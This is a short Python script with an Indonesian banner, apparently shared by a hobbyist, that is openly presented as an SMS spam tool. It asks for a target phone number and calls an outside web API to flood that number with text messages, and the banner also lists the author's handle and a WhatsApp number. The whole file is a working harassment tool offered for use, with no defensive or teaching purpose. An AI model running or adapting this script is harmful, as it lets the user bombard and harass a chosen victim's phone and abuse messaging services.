import requests
import time,os,sys

# clear
os.system('clear')
# logo
print ('——————————————————————————————')
print ('MASIH BELAJAR BIKIN SC SPAM CUY')
print ('——————————————————————————————')
print ('SCRIPT SPAM SMS TERBARU 2022')
print ('——————————————————————————————')
print ('INSTAGRAM = AGUNMYYOUZ')
print ('——————————————————————————————')
print ('Whatsapp = 083149787556')
print ('——————————————————————————————')
print ('                              By AgunXD')
print ('    SPAM SMS BY agunXD')

print ('\n [+]Masukan Nomor Target Diawali 8xxx')

# Run nomor
nomor = input('nomor target : ')
req=requests.get('https://ainxbot-sms.herokuapp.com/api/spamsms',params={'phone' : nomor}).text
if  'terkirim' in req:
     print ('\n[+] Spam berhasil coeg')
else:
     print ('\n[+] Spam gagal dek')
